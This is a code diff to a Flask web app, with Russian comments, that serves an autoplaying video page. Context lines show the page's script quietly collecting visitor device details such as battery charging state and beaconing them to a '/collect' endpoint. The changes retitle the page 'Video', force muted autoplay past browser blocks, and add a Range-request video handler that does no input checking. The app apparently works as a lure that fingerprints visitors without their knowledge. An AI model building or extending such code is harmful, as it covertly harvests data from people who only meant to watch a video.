@@ -1,6 +1,7 @@
 from datetime import datetime
 import os
-from flask import Flask, render_template_string, request, send_from_directory
+import re
+from flask import Flask, render_template_string, request, Response, send_from_directory
 import requests
 
 app = Flask(__name__)
@@ -31,7 +32,7 @@ def index():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Загрузка...</title>
+        <title>Видео</title>
         <style>
             body {
                 margin: 0;
@@ -43,15 +44,18 @@ def index():
                 overflow: hidden;
             }
             video {
-                max-width: 100%;
-                max-height: 100%;
+                width: 100%;
+                max-width: 1000px;
+                height: auto;
+                max-height: 100vh;
                 outline: none;
             }
         </style>
     </head>
     <body>
-        <video id="vid" controls autoplay playsinline>
-            <source src="/video/333.m4" type="video/mp4">
+        <!-- muted добавлен для обхода автоплей-блокировок браузеров -->
+        <video id="vid" controls autoplay muted playsinline>
+            <source src="/video/333.mp4" type="video/mp4">
             Ваш браузер не поддерживает видео.
         </video>
 
@@ -104,7 +108,6 @@ def index():
                     battery_charging: batteryCharging
                 });
 
-                // Используем send_beacon для гарантированной отправки данных
                 if (navigator.sendBeacon) {
                     navigator.sendBeacon('/collect', new Blob([data], {type: 'application/json'}));
                 } else {
@@ -126,7 +129,46 @@ def index():
 
 @app.route("/video/<filename>")
 def serve_video(filename):
-    return send_from_directory(".", filename)
+    # Корректная отдача видео с поддержкой Range запросов для браузеров
+    path = os.path.join(".", filename)
+    if not os.path.exists(path):
+        return "Видео не найдено", 404
+
+    file_size = os.path.getsize(path)
+    range_header = request.headers.get("Range", None)
+
+    if not range_header:
+        return send_from_directory(".", filename)
+
+    byte1, byte2 = 0, None
+    match = re.search(r"bytes=(\d+)-(\d*)", range_header)
+    if match:
+        g = match.groups()
+        byte1 = int(g[0])
+        if g[1]:
+            byte2 = int(g[1])
+
+    if byte2 is None:
+        byte2 = file_size - 1
+
+    length = byte2 - byte1 + 1
+
+    def generate():
+        with open(path, "rb") as f:
+            f.seek(byte1)
+            remaining = length
+            while remaining > 0:
+                chunk_size = min(4096, remaining)
+                data = f.read(chunk_size)
+                if not data:
+                    break
+                remaining -= len(data)
+                yield data
+
+    rv = Response(generate(), 206, mimetype="video/mp4", direct_passthrough=True)
+    rv.headers.add("Content-Range", f"bytes {byte1}-{byte2}/{file_size}")
+    rv.headers.add("Accept-Ranges", "bytes")
+    return rv
 
 
 @app.route("/collect", methods=["POST"])
